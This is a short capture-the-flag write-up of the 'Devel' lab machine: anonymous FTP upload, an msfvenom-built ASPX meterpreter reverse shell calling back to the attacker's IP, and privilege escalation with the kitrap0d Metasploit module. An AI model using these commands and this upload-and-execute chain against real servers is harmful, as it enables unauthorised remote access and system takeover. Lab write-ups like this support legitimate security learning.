Devel Writeup

Nmap results showed port 21 and 80 open.  Port 21 is the default port for FTP, and port 80 is the default port for HTTP.

Successfully access FTP server @ 10.10.10.5 using command 'ftp 10.10.10.5'. Attempted to use anonymous login and was able to gain access without a correct password.

Created test.html file and used 'put test.html' to upload file to server. Then called test.html in browser using '10.10.10.5/test.html' as address. HTML file was uploaded and loaded successfully. This presented the opportunity of dropping a reverse shell onto the target and gaining access through a meterpreter listener.

Accessed Metasploit using 'msfconsole' where I utilised the 'exploit/multi/handler' exploit to set up a listener. I configured the payload to 'windows/meterpreter/reverse_tcp' which I will use to create the reverse shell later. 

'show options' shows required configurations for exploits, and identified I needed to configure LHOST and LPORT, which LHOST was configured to tun0 (Machine IP of 10.10.14.7).

MSFVenom was utilised to create a reverse shell using the command 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx > devel.aspx'. This created a TCP reverse shell payload in an aspx file set with the LHOST and LPORT required and output to devel.aspx.

Going back to the FTP, I used the PUT command as such 'put devel.aspx' to upload the payload to the server. After, I was able to go back to the Metasploit where I ran the listener, and navigated to '10.10.10.5/devel.aspx'. By running the listener and then navigating to devel.aspx in the browser, the reverse shell was executed and a connection was made.

I put the meterpreter session in the background and ran a 'search suggest' to find the local_exploit_suggester. This required configuration as well, to identify the session and once that was set I was able to run the module. 

The results identified 'exploit/windows/local/ms10_015_kitrap0d' which I copied and ran in metasploit. This exploit required configuration for session, and needed modifications to lhost and lport. Once configured and ran, I was able to gain access to a meterpreter session with elevated priviledges. 

From here I navigated to the desktop of both babi and administrator to get the flags. 